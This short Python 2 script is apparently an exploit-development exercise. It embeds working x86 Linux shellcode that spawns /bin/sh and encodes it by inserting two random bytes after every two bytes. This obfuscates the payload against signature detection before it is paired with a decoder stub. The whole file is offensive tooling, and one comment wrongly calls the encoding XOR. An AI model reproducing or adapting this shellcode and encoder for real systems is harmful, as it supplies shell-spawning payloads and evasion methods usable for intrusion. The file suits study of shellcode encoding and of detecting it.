#!/usr/bin/python
import random
# Python random double insertion Encoder 

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x08\x40\x40\x40\xcd\x80")

encoded = ""
encoded2 = ""
counter = 1
print 'Encoded shellcode ...'

for x in bytearray(shellcode) :
	# XOR Encoding 	
	y = x
	encoded += '0x'
	encoded += '%02x,' % y
	if counter == 2 :
		encoded += '0x%02x,' % random.randint(1,254)
		encoded += '0x%02x,' % random.randint(1,254)
		counter = 0
	counter += 1
	
print encoded

print 'Len: %d' % len(bytearray(shellcode))

